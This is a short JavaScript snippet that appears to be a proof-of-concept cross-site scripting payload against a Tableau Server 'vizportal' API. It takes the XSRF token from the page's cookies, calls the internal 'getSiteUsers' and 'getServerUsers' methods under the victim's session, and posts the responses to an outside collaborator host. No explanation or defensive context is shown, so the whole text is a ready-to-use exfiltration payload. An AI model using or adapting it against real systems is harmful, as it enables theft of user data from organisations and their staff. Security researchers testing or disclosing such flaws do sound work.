const serverName = "https://fzipn7r2g2gpf7p18lutk880jrpid81x.oastify.com";

async function exfiltrate(methodName) {
  let res = await fetch(
      `/vizportal/api/web/v1/${methodName}`, {
          headers: {
              "x-xsrf-token": document.cookie.split('=')[1] // assumes CSRF cookie is at the end
          },
          body: JSON.stringify({method:methodName, params:{}}),
          method: "POST",
      }
  );
  await fetch(
      serverName, {
          body: await res.text(),
          method: "POST",
          mode: "no-cors",
      }
  );
}

exfiltrate("getSiteUsers");
exfiltrate("getServerUsers");
